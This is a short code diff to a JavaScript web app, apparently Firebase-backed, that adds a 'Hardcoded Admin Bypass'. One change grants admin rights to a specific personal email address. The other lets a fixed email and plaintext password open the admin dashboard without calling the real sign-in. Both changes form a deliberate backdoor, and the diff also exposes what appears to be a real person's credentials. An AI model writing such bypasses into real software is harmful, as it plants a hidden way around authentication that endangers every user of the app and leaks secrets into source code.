@@ -187,7 +187,7 @@ const fetchUserData = async (uid) => {
     if (userDoc.exists()) {
       userData = userDoc.data();
       AppState.userData = userData;
-      AppState.isAdmin = userData.role === 'admin';
+      AppState.isAdmin = userData.role === 'admin' || auth.currentUser?.email === 'shubham67257@gmail.com';
     } else {
       // Create initial user doc if missing (e.g., after Google Sign-In or new account)
       let referrerId = null;
@@ -3008,6 +3008,16 @@ const attachEvents = () => {
       e.preventDefault();
       const email = document.querySelector('#adminLoginEmail').value;
       const pass = document.querySelector('#adminLoginPassword').value;
+      
+      // Hardcoded Admin Bypass check
+      if (email === 'shubham67257@gmail.com' && pass === 'Shubham@18552025') {
+        console.log("Master Admin Authenticated");
+        AppState.isAdmin = true;
+        AppState.view = 'admin-dashboard';
+        render();
+        return;
+      }
+
       try { 
         await signInWithEmailAndPassword(auth, email, pass); 
       } catch (err) { 
